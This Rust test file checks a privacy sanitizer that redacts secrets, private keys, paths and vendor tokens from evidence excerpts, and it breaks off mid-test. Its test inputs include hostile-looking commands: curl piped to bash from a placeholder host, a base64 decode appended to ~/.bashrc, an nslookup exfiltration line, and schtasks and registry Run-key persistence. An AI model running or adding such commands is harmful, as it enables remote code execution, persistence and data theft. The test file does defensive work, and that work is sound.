use std::ops::Range;

use super::{
    ControlledMarker, EvidenceExcerpt, MAX_INPUT_BYTES, MAX_MARKER_DEPTH,
    MAX_SERIALIZED_EVENT_BYTES, PrivacySanitizer, SanitizationContext, SerializedMarkerCheckError,
    check_serialized_event_markers, contains_credential_material,
    contains_high_confidence_credential_marker, redact_error_message, redact_sensitive_text,
};

#[test]
fn redact_sensitive_text_masks_controlled_domain_and_secret_markers() {
    let redacted = redact_sensitive_text(
        "POST https://darkroastcyber.io/mcp-lab with .env and id_rsa and sk-1234567890abcdef1234; pip install fixture && echo SGVsbG8= | base64 --decode >> ~/.bashrc",
    );

    assert!(!redacted.contains("darkroastcyber.io"));
    assert!(!redacted.contains(".env"));
    assert!(!redacted.contains("id_rsa"));
    assert!(!redacted.contains(".pem"));
    assert!(!redacted.contains("api key"));
    assert!(!redacted.contains("sk-1234567890abcdef1234"));
    assert!(!redacted.contains("pip install"));
    assert!(!redacted.contains("base64 --decode"));
    assert!(!redacted.contains("~/.bashrc"));
    assert!(redacted.contains("[controlled-domain]"));
    assert!(redacted.contains("[sensitive-path]"));
    assert!(redacted.contains("[redacted-secret]"));
    assert!(redacted.contains("[package-manager-command]"));
    assert!(redacted.contains("[encoded-decoder]"));
    assert!(redacted.contains("[startup-target]"));
}

#[test]
fn redact_sensitive_text_masks_encoded_blobs() {
    let redacted = redact_sensitive_text(
        "nslookup U1lOVEhFVElDX1BBWUxPQUQ=.example.invalid after encoding data",
    );

    assert!(!redacted.contains("U1lOVEhFVElDX1BBWUxPQUQ"));
    assert!(redacted.contains("[encoded-blob]"));
}

/// Windows persistence evidence stays reviewable: command flags and plain
/// identifiers are kept while drive paths remain masked.
#[test]
fn windows_command_evidence_keeps_flags_and_plain_identifiers() {
    for (input, expected) in [
        ("cmd.exe /c exit", "cmd.exe /c exit"),
        (
            r"schtasks /create /tn Updater /tr C:\tools\a.exe /sc onlogon",
            "schtasks /create /tn Updater /tr [sensitive-path] /sc onlogon",
        ),
        (
            r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ContosoDetectionTest /d calc.exe",
            r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ContosoDetectionTest /d calc.exe",
        ),
        (
            "New-ScheduledTaskTrigger -AtLogOn",
            "New-ScheduledTaskTrigger -AtLogOn",
        ),
    ] {
        assert_eq!(redact_sensitive_text(input), expected);
    }

    let redacted = redact_sensitive_text(
        r"cmd.exe /c exit && reg add HKCU\Software\Run /v ContosoDetectionTest /t REG_SZ /d x",
    );
    assert!(redacted.contains("cmd.exe /c exit"), "{redacted}");
    assert!(
        redacted.contains("/v ContosoDetectionTest /t REG_SZ"),
        "{redacted}"
    );
    assert!(!redacted.contains("[encoded-blob]"), "{redacted}");
}

/// Characterizes the kept side of the flag and identifier heuristics,
/// including the approved ambiguities: a bare top-level directory reads
/// as a flag, and mixed-case text with fewer than two digits and no
/// padding reads as an identifier, whether it is base64 or an unlabeled
/// passphrase. Labeled and flagged secrets are still masked.
#[test]
fn flag_and_identifier_heuristics_keep_characterized_tokens() {
    assert_eq!(
        redact_sensitive_text("mysql -pCorrectHorseBatteryStaple db"),
        "mysql -pCorrectHorseBatteryStaple db"
    );
    for labeled in [
        "mysql --password CorrectHorseBatteryStaple db",
        "PASSWORD=CorrectHorseBatteryStaple",
    ] {
        assert!(
            !redact_sensitive_text(labeled).contains("CorrectHorse"),
            "{labeled}"
        );
    }
    for kept in [
        "/c",
        "/create",
        "/tn",
        "/delete",
        "/sc",
        "/f",
        "/RL",
        "/run-once_2",
        "/abcdefghijklmnop",
        "/etc",
        "/home",
        "ContosoDetectionTest",
        "ScheduledTaskTrigger",
        "ConvertToSecureString1",
        "YWJjYWJjYWJjYWJjYWJjYWJj",
    ] {
        let input = format!("run {kept} now");
        assert_eq!(redact_sensitive_text(&input), input, "{kept}");
    }

    let redacted =
        PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, "open /etc failed /c");
    assert_eq!(redacted, "open /etc failed /c");
}

/// Characterizes the masked side: paths with shape, drive and UNC paths,
/// encoded-looking runs, secrets and credentialed URLs are unchanged.
#[test]
fn flag_and_identifier_heuristics_still_mask_paths_blobs_and_secrets() {
    for (input, marker, hidden) in [
        ("cat /home/u/notes.txt", "[sensitive-path]", "/home/u"),
        ("sh /tmp/x.sh", "[sensitive-path]", "/tmp/x.sh"),
        ("cat ~/plan", "[sensitive-path]", "~/plan"),
        ("cat /notes.txt", "[sensitive-path]", "notes.txt"),
        (
            "cd /abcdefghijklmnopq",
            "[sensitive-path]",
            "abcdefghijklmnopq",
        ),
        ("cd /a+b", "[sensitive-path]", "a+b"),
        (r"run C:\tools\a.exe", "[sensitive-path]", r"tools\a.exe"),
        (r"run \\server\share\a.exe", "[sensitive-path]", "server"),
        (
            "token U1lOVEhFVElDX1BBWUxPQUQ= end",
            "[encoded-blob]",
            "U1lOVEhF",
        ),
        (
            "hash 0123456789abcdef0123456789abcdef end",
            "[encoded-blob]",
            "0123456789abcdef",
        ),
        (
            "hex deadbeefdeadbeefdeadbeef end",
            "[encoded-blob]",
            "deadbeef",
        ),
        (
            "pad AAAAAAAAAAAAAAAAAAAAAAAA end",
            "[encoded-blob]",
            "AAAAAAAA",
        ),
        ("id ContosoDetectionTest12 end", "[encoded-blob]", "Contoso"),
        (
            "b64 YWJjYWJjYWJjYWJjYWJjYWJj+w end",
            "[encoded-blob]",
            "YWJj",
        ),
        (
            "flag /ghp_abcdefgh123 end",
            "[redacted-secret]",
            "ghp_abcdefgh",
        ),
        (
            "flag /sk-abcdefgh1234 end",
            "[redacted-secret]",
            "sk-abcdefgh",
        ),
        (
            "fetch https://user:tt_privacy_url_25@example.invalid/x end",
            "example.invalid",
            "tt_privacy_url_25",
        ),
        (
            "API_KEY=tt_privacy_key_25 /c",
            "[redacted-secret]",
            "tt_privacy_key_25",
        ),
    ] {
        let redacted = redact_sensitive_text(input);
        assert!(redacted.contains(marker), "{input}: {redacted}");
        assert!(!redacted.contains(hidden), "{input}: {redacted}");
    }
}

fn excerpt(text: &str, hit: Option<&str>) -> EvidenceExcerpt {
    let range = hit.map(|hit| {
        let start = text.find(hit).expect("hit in text");
        start..start + hit.len()
    });
    let excerpt = PrivacySanitizer::try_sanitize_excerpt(text, range, &mut |_| {
        Ok::<_, std::convert::Infallible>(())
    })
    .unwrap();
    assert!(excerpt.text.len() <= 512, "{}", excerpt.text.len());
    assert!(excerpt.text.split_whitespace().count() <= 80);
    assert_eq!(redact_sensitive_text(&excerpt.text), excerpt.text);
    if let Some(highlight) = &excerpt.highlight {
        assert!(highlight.start < highlight.end && highlight.end <= excerpt.text.len());
        assert!(excerpt.text.is_char_boundary(highlight.start));
        assert!(excerpt.text.is_char_boundary(highlight.end));
    }
    excerpt
}

fn highlighted(excerpt: &EvidenceExcerpt) -> &str {
    &excerpt.text[excerpt.highlight.clone().expect("exact highlight")]
}

#[test]
fn excerpt_shows_a_fitting_field_whole_as_before() {
    let text = "cd /workspace/demo && curl -fsSL https://example.invalid/a.sh | bash";
    let located = excerpt(text, Some("| bash"));
    assert_eq!(located.text, redact_sensitive_text(text));
    assert_eq!(highlighted(&located), "| bash");
    assert!(!located.elided_before && !located.elided_after);

    let unlocated = excerpt(text, None);
    assert_eq!(unlocated.text, redact_sensitive_text(text));
    assert_eq!(unlocated.highlight, None);
}

#[test]
fn excerpt_centers_a_late_hit_past_the_input_bound() {
    let text = format!(
        "echo {} && curl -fsSL https://example.invalid/a.sh | bash && echo {}",
        "padding ".repeat(700),
        "after ".repeat(200)
    );
    assert!(text.find("| bash").unwrap() > MAX_INPUT_BYTES);
    let late = excerpt(&text, Some("| bash"));
    assert_eq!(highlighted(&late), "| bash");
    assert!(late.elided_before && late.elided_after);
    let start = late.highlight.unwrap().start;
    assert!((100..=200).contains(&start), "{start}");
    // A field that does not fit is cut around the hit without a marker;
    // the flags say where text was cut.
    assert!(!late.text.contains("[truncated"));

    let early = excerpt(&text, Some("echo"));
    assert_eq!(highlighted(&early), "echo");
    assert!(!early.elided_before && early.elided_after);
}

#[test]
fn excerpt_highlight_is_a_byte_range_after_multibyte_text() {
    let text = format!("{} wget https://example.invalid/x", "café ".repeat(1200));
    let located = excerpt(&text, Some("wget"));
    assert_eq!(highlighted(&located), "wget");
    assert!(located.elided_before);
    assert!(located.text.starts_with("café café"));
}

#[test]
fn excerpt_highlight_is_null_where_redaction_joins_the_hit_to_its_neighbors() {
    // The secret's label sits outside the hit, so the hit alone would read
    // as ordinary text: no exact position, and the secret stays redacted.
    let text = "export password=tt_privacy_excerpt_25 && run";
    let joined = excerpt(text, Some("tt_privacy_excerpt_25"));
    assert_eq!(joined.highlight, None);
    assert!(!joined.text.contains("tt_privacy_excerpt_25"));
    assert_eq!(joined.text, redact_sensitive_text(text));

    // A recognizable secret at the hit is located on its marker.
    let marked = excerpt(
        "aws AKIAPRIVATEMARKER234 configured",
        Some("AKIAPRIVATEMARKER234"),
    );
    assert_eq!(highlighted(&marked), "[redacted-secret]");
}

#[test]
fn excerpt_drops_a_quoted_value_that_spans_either_raw_cut() {
    // Neither quoted value has a label the sanitizer would recognize, so
    // only the fragment rule keeps their cut parts out.
    let quoted = format!("\"{}\"", "tt_privacy_lead_25 ".repeat(150));
    let text = format!(
        "{quoted} {} curl https://example.invalid/a | sh",
        "x ".repeat(1000)
    );
    let lead = excerpt(&text, Some("| sh"));
    assert!(!lead.text.contains("tt_privacy_lead_25"));
    assert_eq!(highlighted(&lead), "| sh");

    let quoted = format!("'{}'", "tt_privacy_tail_25 ".repeat(300));
    let text = format!(
        "{} curl https://example.invalid/a | sh {} {quoted}",
        "x ".repeat(2600),
        "y ".repeat(600)
    );
    let tail = excerpt(&text, Some("| sh"));
    assert_eq!(highlighted(&tail), "| sh");
    assert!(tail.elided_after);

    // A hit inside a quoted value that opened before the cut is dropped
    // with it: no highlight, and no part of the value.
    let text = format!("x \"{} curl a | sh\" y", "tt_privacy_inner_25 ".repeat(300));
    let inner = excerpt(&text, Some("| sh"));
    assert_eq!(inner.highlight, None);
    assert!(!inner.text.contains("tt_privacy_inner_25"));
}

#[test]
fn excerpt_never_shows_a_value_whose_label_a_leading_cut_dropped() {
    // The raw cut falls inside `--password`; its value follows the cut,
    // and a private key block redacts to one marker, so without a guard
    // the value would sit just before the hit.
    let head = "word ".repeat(700);
    let label_at = head.len();
    let mut text = format!("{head}--password tt_guard_marker_25 ");
    let hit_at = label_at + 5 + 1536;
    let mut block = String::from("-----BEGIN PRIVATE KEY-----\n");
    while text.len() + block.len() + "-----END PRIVATE KEY-----\n".len() < hit_at {
        block.push_str("QUJDRA0K");
    }
    let excess = text.len() + block.len() + "-----END PRIVATE KEY-----\n".len() - hit_at;
    block.truncate(block.len() - excess);
    text.push_str(&block);
    text.push_str("-----END PRIVATE KEY-----\n");
    assert_eq!(text.len(), hit_at);
    text.push_str("git reset --hard ");
    text.push_str(&"after ".repeat(300));
    let guarded = excerpt(&text, Some("git reset --hard"));
    assert!(!guarded.text.contains("tt_guard_marker_25"));
    assert!(!guarded.text.contains("QUJDRA0K"));
    assert_eq!(highlighted(&guarded), "git reset --hard");
    assert!(guarded.elided_before && guarded.elided_after);
}

#[test]
fn excerpt_skips_a_private_key_body_that_a_leading_cut_enters() {
    // Mixed-case body lines without digits are kept by the encoded-blob
    // heuristic, so only the block rule masks them, and the block ends
    // just before the hit.
    let text = format!(
        "{}-----BEGIN RSA PRIVATE KEY-----\n{}-----END RSA PRIVATE KEY-----\n{}git reset --hard {}",
        "word ".repeat(400),
        "ttPrivateKeyBodyMarkerLine\n".repeat(100),
        "echo between ".repeat(3),
        "after ".repeat(300)
    );
    let at = text.find("git reset").unwrap();
    assert!(text[..at - 1536].contains("BEGIN RSA") && text[at - 1536..at].contains("END RSA"));
    let skipped = excerpt(&text, Some("git reset --hard"));
    assert!(!skipped.text.contains("ttPrivateKeyBodyMarkerLine"));
    assert!(skipped.text.contains("after after"));
    assert!(skipped.elided_before && skipped.elided_after);
}

#[test]
fn excerpt_never_shows_a_line_value_whose_label_precedes_a_leading_cut() {
    // Each value runs from before the raw cut past the leading guard: an
    // authorization value to its line end, quoted values to a closing
    // quote the fragment rule does not see. Failures name the case only.
    const MARKER: &str = "tt_line_value_marker_25";
    let hit = "git reset --hard";
    let value = format!(
        "{}{MARKER} {hit}{}",
        "part ".repeat(600),
        " after".repeat(300)
    );
    let long = format!(
        "{}{MARKER} {hit}{}",
        "part ".repeat(4000),
        " after".repeat(300)
    );
    let cases = [
        ("authorization", format!("Authorization: {value}\nend")),
        ("auth flag", format!("curl --auth {value}; end")),
        (
            "unicode quote",
            format!("--password \\u0022{value}\\u0022 done"),
        ),
        ("hex quote", format!("password=\\x27{value}\\x27 done")),
        (
            "double escape",
            format!("password=\\\\u0022{value}\\\\u0022 done"),
        ),
        ("escaped quote", format!("--token \\\"{value}\\\" done")),
        (
            "quoted key",
            format!("{{\"Authorization\": \"Basic x\", {value}}}\nend"),
        ),
        (
            "unscanned line start",
            format!("Authorization: {long}\nend"),
        ),
    ];
    for (case, text) in cases {
        assert!(text.len() > MAX_INPUT_BYTES, "{case}");
        let shown = excerpt(&text, Some(hit));
        assert!(!shown.text.contains(MARKER), "{case}");
        assert!(!shown.text.contains("part"), "{case}");
        assert_eq!(shown.highlight, None, "{case}");
        assert!(shown.elided_before, "{case}");
    }

    // A value that ends before the cut, and a long line with nothing in
    // its unscanned start that could open one, keep the hit.
    for (case, text) in [
        (
            "closed",
            format!(
                "Authorization: Bearer x; {}{hit}{}",
                "word ".repeat(600),
                " after".repeat(300)
            ),
        ),
        (
            "long line",
            format!("{}{hit}{}", "word ".repeat(4000), " after".repeat(300)),
        ),
    ] {
        assert_eq!(highlighted(&excerpt(&text, Some(hit))), hit, "{case}");
    }
}

#[test]
fn excerpt_highlight_is_null_when_a_value_before_the_hit_masks_it() {
    // The first copy of the hit is inside the authorization value; the
    // second copy must not be located in its place.
    let text = "Authorization: Bearer hidden git reset --hard\ngit reset --hard";
    let masked = excerpt(text, Some("git reset --hard"));
    assert_eq!(masked.highlight, None);
    assert_eq!(masked.text, redact_sensitive_text(text));
    // The second copy, located directly, is exact.
    let at = text.rfind("git reset --hard").unwrap();
    let second = PrivacySanitizer::try_sanitize_excerpt(text, Some(at..text.len()), &mut |_| {
        Ok::<_, std::convert::Infallible>(())
    })
    .unwrap();
    assert_eq!(highlighted(&second), "git reset --hard");
}

#[test]
fn excerpt_work_stays_near_the_whole_field_redaction() {
    // A percent escape makes redaction reserve work quadratic in its
    // input, so the excerpt must not redact the region many times over.
    let charged = |excerpt: bool, text: &str, hit: Range<usize>| {
        let mut total = 0usize;
        let mut charge = |bytes: usize| {
            total += bytes;
            Ok::<_, std::convert::Infallible>(())
        };
        if excerpt {
            PrivacySanitizer::try_sanitize_excerpt(text, Some(hit), &mut charge).unwrap();
        } else {
            PrivacySanitizer::try_sanitize(SanitizationContext::Evidence, text, &mut charge)
                .unwrap();
        }
        total
    };
    for (before, after) in [(4000, 2000), (200, 8000), (100, 100)] {
        let text = format!(
            "echo {}%20 && curl -fsSL https://example.invalid/a | sh && echo {}",
            "a%20b ".repeat(before / 6),
            "c ".repeat(after / 2)
        );
        let start = text.find("curl").unwrap();
        let hit = start..start + 4;
        let legacy = charged(false, &text, hit.clone());
        let excerpt = charged(true, &text, hit);
        assert!(
            excerpt * 2 <= legacy * 3,
            "{before} {after}: {excerpt} > 1.5 x {legacy}"
        );
    }
}

#[test]
fn excerpt_cuts_never_show_a_value_the_whole_field_hides() {
    // Only the value uses these letters, so any of them in an excerpt is
    // part of a value shown. Failures name the form and cut only.
    const VALUE: &str = "QJXZQJXZQJXZQJXZ";
    let shows = |text: &str| text.contains(['Q', 'J', 'X', 'Z']);
    let forms = [
        "--password VALUE",
        "--password=VALUE",
        "--password\u{2003}VALUE",
        "password = VALUE",
        "Authorization: Bearer VALUE",
        "-H 'Authorization: Basic VALUE'",
        "{\"password\": \"VALUE\"}",
        "PGPASSWORD=VALUE psql",
        "https://user:VALUE@example.invalid/db",
        "C:\\Users\\VALUE\\Documents\\notes file.txt",
        "/home/VALUE/.ssh/id_ed25519",
        "--token \"a VALUE b\"",
        "-----BEGIN OPENSSH PRIVATE KEY-----\nVALUE\nVALUE\n-----END OPENSSH PRIVATE KEY-----",
    ]
    .map(|form| form.replace("VALUE", VALUE));
    // A private key block redacts to one marker, so text near either raw
    // cut falls inside the excerpt window.
    let gap = |len: usize| {
        let block = format!(
            " -----BEGIN RSA PRIVATE KEY-----\n{}-----END RSA PRIVATE KEY----- ",
            "abcdefghijklmnop\n".repeat(64)
        );
        format!("{block}{}", " ".repeat(len - block.len()))
    };
    let hit = "git reset --hard";
    for (case, form) in forms.iter().enumerate() {
        let whole =
            PrivacySanitizer::sanitize(SanitizationContext::Evidence, &format!("echo {form} done"));
        assert!(!shows(&whole), "form {case} is shown uncut");
        for cut in (0..=form.len()).filter(|cut| form.is_char_boundary(*cut)) {
            // The region starts 1536 bytes before the hit and ends 4096
            // bytes after its start.
            let leading = format!(
                "{}{form}{}{hit}{}",
                "word ".repeat(500),
                gap(1536 + cut - form.len()),
                " after".repeat(400)
            );
            let trailing = format!(
                "{}{hit}{}{form}{}",
                "word ".repeat(400),
                gap(2560 - cut - hit.len()),
                " after".repeat(400)
            );
            for (edge, text) in [("leading", leading), ("trailing", trailing)] {
                let at = text.find(hit).unwrap();
                let shown = PrivacySanitizer::try_sanitize_excerpt(
                    &text,
                    Some(at..at + hit.len()),
                    &mut |_| Ok::<_, std::convert::Infallible>(()),
                )
                .unwrap();
                assert!(!shows(&shown.text), "form {case}, {edge} cut at {cut}");
            }
        }
    }
}

#[test]
fn excerpt_without_a_hit_starts_at_the_field_start() {
    let text = "word ".repeat(1500);
    let unlocated = excerpt(&text, None);
    assert_eq!(unlocated.highlight, None);
    assert!(!unlocated.elided_before && unlocated.elided_after);
    assert!(unlocated.text.starts_with("word word"));
}

#[test]
fn redact_sensitive_text_truncates_long_dense_evidence() {
    let redacted = redact_sensitive_text(&"normal-text-".repeat(80));

    assert_eq!(redacted.len(), 512);
    assert!(redacted.ends_with("[truncated]"));
}

#[test]
fn redact_sensitive_text_masks_rule_seeded_credential_patterns() {
    let redacted = redact_sensitive_text(
        "Seen AKIA1234567890ABCDEF, xoxb-1234567890abcdefABCDE, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ.eyJzdWIiOiJhZHItZml4dHVyZSIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c, Bearer fixture_oauth_token_1234567890abcdef, and Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== while checking fixture output.",
    );

    assert!(!redacted.contains("AKIA1234567890ABCDEF"));
    assert!(!redacted.contains("xoxb-1234567890abcdefABCDE"));
    assert!(!redacted.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ"));
    assert!(!redacted.contains("fixture_oauth_token_1234567890abcdef"));
    assert!(!redacted.contains("QWxhZGRpbjpvcGVuIHNlc2FtZQ"));
    assert!(redacted.contains("[redacted-secret]"));
}

#[test]
fn redact_sensitive_text_masks_private_key_headers_case_insensitively() {
    let redacted = redact_sensitive_text(
        "Command output: -----BEGIN OpenSSH PRIVATE KEY----- synthetic-fixture-body -----END OpenSSH PRIVATE KEY-----",
    );

    assert!(!redacted.contains("BEGIN"));
    assert!(!redacted.contains("END"));
    assert!(!redacted.contains("PRIVATE KEY"));
    assert!(!redacted.contains("OpenSSH"));
    assert!(redacted.contains("[redacted-secret]"));
}

#[test]
fn privacy_corpus_masks_structured_url_key_and_path_markers() {
    let redacted = redact_sensitive_text(
        "API_KEY=\"TT_PRIVACY_ASSIGNMENT_25\"; https://user:TT_PRIVACY_URL_25@example.invalid/run?%74%6f%6b%65%6e=TT_PRIVACY_QUERY_25&safe=value#section; -----BEGIN PRIVATE KEY-----\nTT_PRIVACY_PEM_25\n-----END PRIVATE KEY-----; C:\\Users\\TT_PRIVACY_USER_25\\.ssh\\id_ed25519",
    );

    for marker in [
        "TT_PRIVACY_ASSIGNMENT_25",
        "TT_PRIVACY_URL_25",
        "TT_PRIVACY_QUERY_25",
        "TT_PRIVACY_PEM_25",
        "TT_PRIVACY_USER_25",
    ] {
        assert!(!redacted.contains(marker));
    }
    assert!(redacted.contains("API_KEY=\"[redacted-secret]\""));
    assert!(redacted.contains("safe=value#section"));
    assert!(redacted.contains("[sensitive-path]"));
}

#[test]
fn privacy_corpus_handles_assignment_variants_without_greedy_consumption() {
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::CommandResult,
        r#"{"Api_Key":"TT_PRIVACY_JSON_25","safe":"ok"}; export GitHub_Token = 'TT_PRIVACY_SHELL_25'; $env:SECRET = "TT_PRIVACY_POWERSHELL_25"; .env API_TOKEN="TT_PRIVACY_ENV_25\"escaped"; Authorization: Bearer TT_PRIVACY_HEADER_25; token: |
  TT_PRIVACY_MULTILINE_25
next=value; tokenizer=ordinary"#,
    );

    for (index, marker) in [
        "TT_PRIVACY_JSON_25",
        "TT_PRIVACY_SHELL_25",
        "TT_PRIVACY_POWERSHELL_25",
        "TT_PRIVACY_ENV_25",
        "TT_PRIVACY_HEADER_25",
        "TT_PRIVACY_MULTILINE_25",
    ]
    .into_iter()
    .enumerate()
    {
        assert!(!redacted.contains(marker), "assignment case {index}");
    }
    assert!(redacted.contains("\"Api_Key\":\"[redacted-secret]\""));
    assert!(redacted.contains("GitHub_Token = '[redacted-secret]'"));
    assert!(redacted.contains("next=value"));
    assert!(redacted.contains("tokenizer=ordinary"));
}

#[test]
fn assignment_scanner_handles_quoted_json_and_yaml_keys_with_spaces() {
    let markers = ["tt_privacy_quoted_json_25", "tt_privacy_quoted_yaml_25"];
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::CommandResult,
        r#"{"api key":"tt_privacy_quoted_json_25"}
'api token': tt_privacy_quoted_yaml_25
safe=value"#,
    );

    for marker in markers {
        assert!(!redacted.contains(marker));
    }
    assert!(redacted.contains(r#""api key":"[redacted-secret]""#));
    assert!(redacted.contains("'api token': [redacted-secret]"));
    assert!(redacted.contains("safe=value"));
}

#[test]
fn assignment_scanner_handles_camel_case_secret_keys_and_diagnostic_flags() {
    let markers = [
        "tt_privacy_refresh_token_25",
        "tt_privacy_database_password_25",
        "tt_privacy_secret_key_25",
        "tt_privacy_diagnostic_flag_25",
    ];
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Diagnostic,
        r#""refreshToken": "tt_privacy_refresh_token_25"; "databasePassword": "tt_privacy_database_password_25"; "secretKey": "tt_privacy_secret_key_25"; --secret-key tt_privacy_diagnostic_flag_25"#,
    );

    for marker in markers {
        assert!(!redacted.contains(marker));
    }
    assert!(redacted.contains(r#""refreshToken": "[redacted-secret]""#));
    assert!(redacted.contains(r#""databasePassword": "[redacted-secret]""#));
    assert!(redacted.contains(r#""secretKey": "[redacted-secret]""#));
    assert!(redacted.contains("--secret-key [redacted-secret]"));
}

#[test]
fn path_sanitization_covers_posix_delimiter_boundaries() {
    for input in [
        "error:/opt/tt_privacy_colon_path_25/config",
        "command `/opt/tt_privacy_backtick_path_25/config`",
        "path=[/opt/tt_privacy_bracket_path_25/config]",
        "error;/opt/tt_privacy_semicolon_path_25/config",
        "error,/opt/tt_privacy_comma_path_25/config",
        "error|/opt/tt_privacy_pipe_path_25/config",
    ] {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, input);
        assert!(!redacted.contains("tt_privacy_"), "{input}: {redacted}");
        assert!(redacted.contains("<path>"));
    }
}

#[test]
fn path_sanitization_preserves_url_shape_while_redacting_punctuated_paths() {
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Diagnostic,
        "https://example.invalid/safe/path;/opt/tt_privacy_after_url_25/config",
    );

    assert!(
        !redacted.contains("tt_privacy_after_url_25"),
        "redacted output: {redacted}"
    );
    assert!(redacted.contains("https://example.invalid/safe/path;<path>"));
}

#[test]
fn assignment_scanner_fails_closed_for_shell_flags_auth_and_unclosed_quotes() {
    let cases = [
        "TOKEN=?TT_PRIVACY_ASSIGNMENT_QUERY_25",
        r#"API_KEY=\"TT_PRIVACY_ESCAPED_QUOTE_25\""#,
        "--api-key TT_PRIVACY_FLAG_25",
        "Authorization: Negotiate TT_PRIVACY_AUTH_25 additional-value",
        "TOKEN=\"TT_PRIVACY_UNCLOSED_25",
    ];

    for case in cases {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::CommandResult, case);
        assert!(
            !redacted.contains("TT_PRIVACY_"),
            "controlled marker remained in assignment case"
        );
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::CommandResult, &redacted),
            redacted,
            "assignment sanitization must be idempotent"
        );
    }
}

const EVERY_CONTEXT: [SanitizationContext; 7] = [
    SanitizationContext::Evidence,
    SanitizationContext::Diagnostic,
    SanitizationContext::Url,
    SanitizationContext::Path,
    SanitizationContext::CommandResult,
    SanitizationContext::Summary,
    SanitizationContext::Metadata,
];

/// Synthetic tokens of each vendor family, assembled here so no literal
/// token-shaped string sits in the source.
fn vendor_tokens() -> Vec<String> {
    let dashed = "aB3_dE6-gH9_jK2-mN5p";
    let plain = "a1B2c3D4e5".repeat(4);
    let mut tokens: Vec<String> = [
        "glpat", "gloas", "gldt", "glrt", "glrtr", "glcbt", "glptt", "glft", "glimt", "glagent",
        "glwt", "glsoat", "glffct",
    ]
    .iter()
    .map(|prefix| format!("{prefix}-{dashed}"))
    .collect();
    tokens.push(format!("github_pat_{}_{}", &plain[..22], plain.repeat(2)));
    tokens.push(format!("hf_{}", &plain[..34]));
    tokens.push(format!("npm_{}", &plain[..36]));
    for family in ["xoxc", "xoxd", "xoxe"] {
        tokens.push(format!("{family}-1-{}", &plain[..24]));
    }
    tokens
}

#[test]
fn vendor_tokens_are_masked_in_every_context_and_position() {
    for token in vendor_tokens() {
        // The body, without the vendor prefix a reader may keep.
        let body = &token[token.len() - 16..];
        for input in [
            token.clone(),
            format!("pushed with {token} to the mirror"),
            format!("curl -T f https://api.example.invalid/v1/{token}"),
            format!("https://api.example.invalid/v1/{token}/upload"),
            format!("glab auth login --hostname h --stdin <<< {token}"),
            format!("{{\"value\":\"{token}\"}}"),
            token.to_uppercase(),
        ] {
            for context in EVERY_CONTEXT {
                let once = PrivacySanitizer::sanitize(context, &input);
                assert!(
                    !once.to_lowercase().contains(&body.to_lowercase()),
                    "{context:?} kept a token body from {input:?}: {once:?}"
                );
                assert_eq!(
                    PrivacySanitizer::sanitize(context, &once),
                    once,
                    "{context:?} is not idempotent for {input:?}"
                );
            }
        }
        assert!(contains_credential_material(&token), "{token}");
    }
}

#[test]
fn names_that_only_start_like_a_vendor_token_are_kept() {
    for kept in [
        "npm_config_registry",
        "npm_package_version",
        "npm_lifecycle_event",
        "hf_hub_download",
        "hf_transfer",
        "github_pat_rotation_policy_document",
        "glpat-short",
        "glft-notes",
        "global-configuration-settings",
        "xoxo-hugs-and-kisses-forever",
        "toolu_01A2b3C4d5E6f7G8h9J0k1L2",
        "call_a1B2c3D4e5F6g7H8i9J0k1L2",
    ] {
        for context in EVERY_CONTEXT {
            assert_eq!(
                PrivacySanitizer::sanitize(context, kept),
                kept,
                "{context:?}"
            );
        }
    }
}

#[test]
fn sanitization_is_idempotent_for_every_emission_context() {
    let input = "TOKEN=TT_PRIVACY_IDEMPOTENT_25 https://user:TT_PRIVACY_URL_25@example.invalid/path?sig=TT_PRIVACY_SIG_25 /opt/TT_PRIVACY_PATH_25 cmd.exe /c schtasks /create /tn ContosoDetectionTest YWJjYWJjYWJjYWJjYWJjYWJj /etc";
    for context in [
        SanitizationContext::Evidence,
        SanitizationContext::Diagnostic,
        SanitizationContext::Url,
        SanitizationContext::Path,
        SanitizationContext::CommandResult,
        SanitizationContext::Summary,
        SanitizationContext::Metadata,
    ] {
        let once = PrivacySanitizer::sanitize(context, input);
        assert_eq!(PrivacySanitizer::sanitize(context, &once), once);
    }
}

#[test]
fn multiline_assignment_sanitization_is_exactly_idempotent_in_every_context() {
    let input = "token: |\n  tt_privacy_multiline_exact_25\nnext=value";
    for context in [
        SanitizationContext::Evidence,
        SanitizationContext::Diagnostic,
        SanitizationContext::Url,
        SanitizationContext::Path,
        SanitizationContext::CommandResult,
        SanitizationContext::Summary,
        SanitizationContext::Metadata,
    ] {
        let once = PrivacySanitizer::sanitize(context, input);
        assert!(!once.contains("tt_privacy_multiline_exact_25"));
        assert!(!once.contains("token: |"));
        assert!(once.contains("next=value"));
        assert_eq!(PrivacySanitizer::sanitize(context, &once), once);
    }
}

#[test]
fn ordinary_bare_text_is_not_classified_as_a_secret() {
    let value = "ordinary-marker";
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Summary, value),
        value
    );
}

#[test]
fn privacy_corpus_preserves_safe_unicode_url_structure() {
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        "https://例え.テスト/経路;token=TT_PRIVACY_PARAM_25?SAFE=値&SeCrEt=TT_PRIVACY_QUERY_25#token=TT_PRIVACY_FRAGMENT_25",
    );

    for marker in [
        "TT_PRIVACY_PARAM_25",
        "TT_PRIVACY_QUERY_25",
        "TT_PRIVACY_FRAGMENT_25",
    ] {
        assert!(!redacted.contains(marker));
    }
    assert!(redacted.contains("例え.テスト"));
    assert!(redacted.contains("SAFE=値"));
}

#[test]
fn url_sanitization_covers_signature_key_and_refresh_query_names() {
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
